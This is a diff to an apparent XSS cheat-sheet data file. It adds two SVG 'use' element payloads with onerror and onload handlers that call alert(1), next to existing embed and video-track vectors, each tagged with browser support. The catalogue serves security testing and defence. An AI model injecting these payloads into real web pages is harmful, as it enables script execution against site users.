@@ -2292,6 +2292,12 @@
         "code": "<embed src=1 onerror=alert(1) type=image/gif>",
         "browsers": ["chrome", "safari"],
         "interaction": false
+      },
+      {
+        "tag": "use",
+        "code": "<svg><use href=\"x\" onerror=\"alert(1)\"></use></svg>",
+        "browsers": ["chrome"],
+        "interaction": false
       }
     ]
   },
@@ -4560,6 +4566,12 @@
         "tag": "track",
         "code": "<video><track default onload=alert(1) src=\"data:text/vtt,WEBVTT\"></video>",
         "browsers": ["chrome", "firefox", "safari"],
+        "interaction": false
+      },
+      {
+        "tag": "use",
+        "code": "<svg><use href=\"/index_files/portswigger-logo.svg\" onload=\"alert(1)\"></use></svg>",
+        "browsers": ["chrome"],
         "interaction": false
       }
     ]
